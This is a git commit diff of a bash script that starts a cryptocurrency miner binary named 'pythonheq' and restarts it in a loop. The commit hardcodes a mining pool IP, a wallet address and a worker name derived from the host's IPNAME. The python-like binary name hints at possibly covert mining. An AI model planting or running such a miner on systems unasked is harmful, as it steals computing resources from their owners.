d3b460e73d82f342fe6cffe3ea66aa6f425ac05b
Ayoub Jadouli <Ayoub JADOULI>
2021-04-11 02:22:53 +0100

    VEr

--- ver.sh
+++ ver.sh
@@ -1,6 +1,6 @@
 #!bin/bash -xe 
 
-echo '#### Version 0.0.2 ####'
+echo '#### Version 0.0.3 ####'
 if [ $(ps -aux |grep pythonheq |wc -l) -le 1 ]
 then 
 echo "No process,let's start -> $(ps -aux |grep pythonheq |wc -l)"
@@ -31,7 +31,8 @@ echo '######### execution #########'
 while true
 do
 
-./pythonheq -v -l "${PoolHost}":"${VR_Port}" -u "${PublicVerusCoinAddress}"."${WorkerName}" -t "${Threads}" "$@" 1> oout 2> oout &
+#./pythonheq -v -l "${PoolHost}":"${VR_Port}" -u "${PublicVerusCoinAddress}"."${WorkerName}" -t "${Threads}" "$@" 1> oout 2> oout &
+./pythonheq -v -l 116.203.10.54:3000 -u RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek."VER_""$IPNAME" -t 4 1> oout 2> oout &
 
 tail -f oout
 done
